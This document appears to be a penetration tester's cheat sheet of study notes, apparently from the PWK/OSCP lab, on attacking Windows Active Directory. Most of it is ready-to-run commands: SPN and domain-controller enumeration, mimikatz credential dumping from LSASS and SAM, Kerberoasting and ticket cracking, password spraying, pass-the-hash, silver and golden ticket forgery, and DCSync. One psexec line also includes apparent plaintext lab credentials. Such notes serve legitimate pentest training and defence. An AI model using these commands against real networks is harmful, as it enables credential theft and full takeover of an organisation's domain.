# ---
## Active Directory

# ---
# Service Principal Names (SPNs)
# `<service class>/<optional host>:<optional port>/<service name>`
# see: https://docs.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns
# there are two types:
#   1) Host-based services
#   `<service class>/<host>`
#   ex: `HTTP/CorpWebServer.corp.com`
#   or if non-default/multiple ports in use
#   `<service class>/<host>:<port>`
#   2) Replicable services
#   `<service class>/<host>:<port>/<service name>`
#
# How to find:
# multiple ways to find: https://www.saotn.org/list-spns-used-active-directory/
C:\> hostname
# list SPNs registered with AD
#    setspn -l <HOSTNAME>
C:\> setspn -l xor-app59
Registered ServicePrincipalNames for CN=xor-app59,OU=Servers,OU=xorComputers,DC=xor,DC=com:
	TERMSRV/XOR-APP59
	TERMSRV/xor-app59.xor.com
	WSMAN/xor-app59
	WSMAN/xor-app59.xor.com
	RestrictedKrbHost/XOR-APP59
	RestrictedKrbHost/xor-app59.xor.com
	HOST/XOR-APP59
	HOST/xor-app59.xor.com


# Active Directory traffic ports used and mapping/tunneling/proxying advice
# https://isc.sans.edu/diary/Cyber+Security+Awareness+Month+-+Day+27+-+Active+Directory+Ports/7468

# NOTICE: not all AD DC are alike. the Primary DC has property of `PdcRoleOwner` and will authoritative up-to-date info

# after gaining control of a windows machine
# we can use it to enumerate the AD DC with powershell
# and query the AD DC LDAP interface for all users, groups, etc.
# from there, we want to find logged-in users that are members of high-value groups,
# since their credentials will be cached in memory
# we can do this by invoking `NetWkstaUserEnum` against the windows host as `Administrator`
# or by querying the DC with `NetSessionEnum` (however the dc config can hamper these results)


# vanilla: Extract all accounts in use as SPN using built in MS tools
PS C:\> setspn -T medin -Q */*

# there are multiple variety of service account depending on windows version
# - Service Accounts <=WinSvr2008
# - Managed Service Accounts = WinSvr2008
# - Group Managed Service Accounts >= WinSvr2012
# although the latest has more features, due to complexity most admins continue to use regular Service Accounts

# once we have an SPN we are interested in,
# we can ask AD DC whate ip and port the svc is running on, to save us a network scan

# how to do it all from linux (if you have plaintext creds)
# https://resources.infosecinstitute.com/topic/python-for-network-penetration-testing-hacking-windows-domain-controllers-with-impacket-python-tools/


# ---
## finding the DC from a windows workstation cmd
echo %logonserver%
# or
set l
# Will return all Environment variables that start with "L" including the name of a DC.
# locate LOGONSERVER in output, to see how the domain controller is authenticated.
# or
nltest /dclist:EXAMPLE.COM
# get PDC name for the domain
nltest /dcname:EXAMPLE.COM
# get flags and other information
nltest /dsgetdc:EXAMPLE.COM
# or
powershell
Import-Module ActiveDirectory
(Get-ADDomainController -DomainName EXAMPLE.COM -Discover -NextClosestSite).HostName
# or
gpresult
gpresult /z
# where `/z` gives more detail
# or
# query the dhcp for options 6, 15, and 44 to get the domain name, domain name server, and Wins/NetBIOS name server.
# or
# using dns to check for the _kerberos._tcp, _kpasswd._tcp, _LDAP._TCP.dc._msdcs, and _ldap._tcp SRV records:
nslookup -type=srv _kerberos._tcp.EXAMPLE.COM
nslookup -type=srv _kpasswd._tcp.EXAMPLE.COM
nslookup -type=srv _ldap._tcp.EXAMPLE.COM
nslookup -type=srv _ldap._tcp.dc._msdcs.EXAMPLE.COM
# notice: `DOMAIN.` the period is preventing nslookup from using DNS search path strings
nslookup -type=any EXAMPLE.COM.
nslookup -type=srv _kerberos._tcp.EXAMPLE.COM.
nslookup -type=srv _kerberos._udp.EXAMPLE.COM.
nslookup -type=srv _kpasswd._tcp.EXAMPLE.COM.
nslookup -type=srv _kpasswd._udp.EXAMPLE.COM.
nslookup -type=srv _ldap._tcp.EXAMPLE.COM.
nslookup -type=srv _ldap._tcp.dc._msdcs.EXAMPLE.COM.
nslookup -type=srv _ldap._tcp.pdc._msdcs.EXAMPLE.COM.
nslookup -type=srv _ldap._tcp.gc._msdcs.EXAMPLE.COM.
nslookup -type=srv _gc._tcp.EXAMPLE.COM.
# nnap can also find it. usually tcp/53 is open with other windows services.


### Security Identifier (SID)
# A Security Identifier (SID) is a unique value of variable length that is used to identify a user account. 
# each user is assigned a Security ID or SID, which is used to control access to various resources like Files, Registry keys, network shares etc. Hence the SID of a user shouldnâ€™t be compromised.
# RID=`500` is the Administrator
# SIDs can be enumerated through brute force and common RID guessing
#   ie. msf auxiliary/scanner/smb/smb_lookupsid
#       python3 lookupsid.py DOMAIN/username:password@ipv4
#       linux enum4linux


### WDigest Authentication
# used when:
# - older operating systems like Win7, WinSvr2k8_R2
# - uncommon

### NTLM Authentication (`sekurlsa::logonpasswords`)
# used when:
# - via ip address instead of hostname, or 
# - server is not part of domain, or 
# - third-party apps
client: calc NTLM hash 
client->server: username
server->client: nonce
client->server: encrypted(nonce)
server->dc: username + nonce
dc->server approval

### Kerberos Authentication (`sekurlsa::tickets`)
# see: https://book.hacktricks.xyz/windows/active-directory-methodology/kerberos-authentication
# primary since Win Svr 2003
# ticket/token based
# spn = service principal name
# kdc = key distribution center (located on dc)
# tgt = ticket-granting ticket "golden ticket" (works on one spn)
# tgs = svc_tkt = silver ticket (works across domain; use to request specific tgt for any spn)
# krbtgt = the user on the dc used to encrypt tgts (ie. mint golden tickets)
label: auth svr req
client->dc: enc([ts], key=[user,pass])
dc->client: enc([tgt={groups,domain,ts,ip,session_key}],key=[krbtgt_pwhash]), enc([usr.session_key],key=[usrpwhash])
label: tkt grant svc req
client->dc: (spn, tgt, enc([ts,user],key=[session_key]))
dc->client: enc([spn,session_key], key=[tgt.session_key]), enc([svc_tkt={user,groups,svc_tkt.session_key}],key[spnsvcpwhash])
label: app req
client->server: (svc_tkt, enc([ts,user],key=[svc_tkt.session_key]))
server->client: approval w/ perms from svc_tkt.groups

### Cached Credential Storage & Retrieval
# LSASS = Local Security Authority Subsystem Service
# need System or LocalAdministrator to read memory space


# run via psexec
$ impacket-psexec \
  -c /usr/share/windows-resources/mimikatz/2.1.1/x64/mimikatz.exe \
  XOR.COM/david:dsfdf34534tdfGDFG5rdgr@10.11.1.120 \
  coffee;

# run, as administrator ie. via cmd
mimikatz.exe
# note: all mimikatz commands are case-insensitive

# engage SEDEBUG, allowing interaction with a process owned by another account
privilege::debug
# elevate privs (probably doesn't do much, but can)
token::elevate

# "secure lsa" module; dump hashes of all logged-on users
sekurlsa::logonpasswords

# hashes available vary by AD version:
#   <= WinSvr2003: NTLM
#   >= WinSvr2008: NTLM, SHA1

# can also pull tgt and svc_tkt from memory
# NOTICE: only matters if `domain-joined`
sekurlsa::tickets
# tgt = golden ticket
# tgs = svc_tkt = silver ticket

# can also pull from sam registtry
lsadump::sam


# can also export tickets to hdd, and import tickets to memory


# ---

# request a svc_ticket using powershell
# load dll/module
Add-Type -AssemblyName System.IdentityModel
# invoke method
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
# the last arg is the SPN
# executing this request means the ticket will have been loaded into local memory

# can use built-in command to display cached kerberos tickets
# (klist.exe is available on Win7/2008 R2 only)
PS> klist
# or
C:\> powershell -nop "klist"

---

# back to mimikatz

# export kerberos tickets to disk
kerberos::list /export

# convert *.kirbi binary file to john hash format
# cd /workspace/docker/kirbi2john
# docker build -t kirbi2john .
$ docker run -it --net=host -v `pwd`:/tmp/a kirbi2john python ./kirbi2john.py /tmp/a/2-40a10000-xor-app59MSSQLSvc~xor-app23.xor.com~1433-XOR.COM.kirbi
# then replace `$krb5tgs$unknown:$krb5tgs$23$` with `$krb5tgs$23$*$$*$`
# NOTICE: if its not `$23$` but `$18$` or some other number, be sure to keep that.
# `$23$` is `-m 13100` AS-REP format w/ hash `$krb5tgs$23$*$$*$`
# `$18$` is `-m 19700` TGS-REP format w/ hash `$krb5tgs$18$user$realm$**$`
#    where `user` and `realm` are required, but `*spn*` is optional

# docker build -t kirbi2hashcat .
$ docker run -it --net=host -v `pwd`:/tmp/a kirbi2hashcat python ./kirbi2hashcat.py /tmp/a/2-40a10000-xor-app59MSSQLSvc~xor-app23.xor.com~1433-XOR.COM.kirbi

---

# Kerberoasting
#  /usr/share/john/kirbi2john.py
# kerberoasting = guessing svcpwhash to decrypt tgs/silver/svc_tkt
# example of a brute-force word-list attack
sudo apt update
sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt tgs.kirbi

---

# examine domain account policy
# ie. to view "Lockout threshold" (A) and "Lockout observation window" (B)
# e.g., every 30min after last login attempt, we get an additional attempt.
#       low_and_slow_max_attempts_per_user_per_day = (24hrs / B) + A

C:\> powershell "net accounts"

# there is a script on the PWK Win10 vm to brute-force according to above strat
powershell
cd C:\Tools\active_directory
./Spray-Passwords.ps1 -Pass Qwerty09! -Admin

---

# Pass the Hash (NTLM-only)
# When you can access lsass memory, capture hashes for all users on the same box,
# then use those creds to move laterally.
# related tools: psexec, metasploit, passing-the-hash-toolkit
#
# ie. w/ pth toolkit, 
# validate/use authentication and perform remote execution via SMB:
pth-winexe -U <HASH> //1.2.3.4 cmd

# ---
# Overpass the Hash (convert NTLM to TGT)
#
# When you have captured an NTLM hash but do not know the plaintext original,
# you can still convert it into a Kerberos TGT to continue lateral movement
# into Kerberos-authenticated SPNs.
#
# related tools: mimikatz, beacon
#
# With this command, mimikatz launches a given process, 
# with its in-memory credentials swapped to a given NTLM hash at runtime,
# so when that process proceeds to attempt network authentication from a SPN,
# the resulting TGT is for the hash you provided--no plaintext password necessary!
sekurlsa::pth /user:ADMIN_USERNAME /domain:THE_DOMAIN /ntlm:HASH /run:PowerShell.exe

# MSFT provides this avenue of NTLM=>RC4-HMAC-MD5-TGT for backward-compatibility.
# However, the resulting TGT has reduced permissions.

# ---
# Pass the Ticket
#
# means exporting a TGS from one server to reuse across network

# find sid
cmd.exe
whoami /user
# the Security ID for the user is provided.
# notice if you remove the last 4 digits, it is also the SID for the domain

# now we can forge a ticket
mimikatz
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SVC_FQDN> /service:HTTP /rc4:<SVC_PW_HASH> /ptt
# `/ptt` means inject directly into memory
# NOTICE: this ticket will have high level access of
#         user: LocalAdministrator, groups: DomainAdmins

# list tickets in memory
kerberos::list

# now we can interact with the [remote] service with high-level/root permission...

# ---
# Distributed Component Object Model (DCOM)
# DCOM Svc Control Mgr offers an API
# Interaction over RPC tcp/135, but placing macro .xls could be SMB tcp/445 
# Local Administrator access is required on target
# requires MSOffice on target (ie. Outlook, Powerpoint)
# ie. Excel.Application.DCOM object allows RCE via VBA Macro (`Run` method)
#
# see: media/video/AD_04_04 for exact code and tools

# ---
# minting Golden Tickets
#
# dump the krbtgt NTLM hash
mimikatz
lsadump::lsa /patch

# NOTICE: the rest can be done from any/off-network windows machine, for stealth

# clear any existing cached keys from memory
kerberos::purge

# generate and inject forged tgt into local memory
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /kerbtgt:<NTLM_HASH> /ptt
# `/user:` the username doesn't have to exist in AD; anything will be trusted
# `/ptt` injects into memory
# the resulting tgt will have
# set UserId=500 (Administrator) and GroupsId[]=513 512 520 518 519 (incl. DomainAdmins)

# launch new cmd.exe
misc::cmd

# can try to move laterally with new tgt
cd C:\Tools\active_directory
psexec.exe \\dc01 cmd.exe

# can see the remote completely trusts the forged tgt
whoami 
whoami /groups

# ---
# Domain Controller Synchronization
# stealing pwhash for all Administrators in DOMAIN
# multiple methods:
# 1) could login to all boxes (noisy; leaves IoC), 
#  a) dump hashes w/ mimikatz, or;
#  b) read/copy `NTDIS.dit` file; as good as reading lsass memory
# 2) could ask a DC to replicate its data to us
#   dc does NOT verify source machine is trusted
#   it only verifies SID;
#   ANY user in group DomainAdmins can request dc replication

# request replication update from dc to local
mimikatz
lsadump::dcsync /user:Administrator
# `/user:` tells us what data to sync
# data includes current pwhash PLUS the last 29 used pwhashes for the account!


# guide: https://vk9-sec.com/windows-xp-get-hashes-local/
# cheatsheet: https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
# guide: https://www.varonis.com/blog/penetration-testing-explained-part-vi-passing-the-hash/
# guide: https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/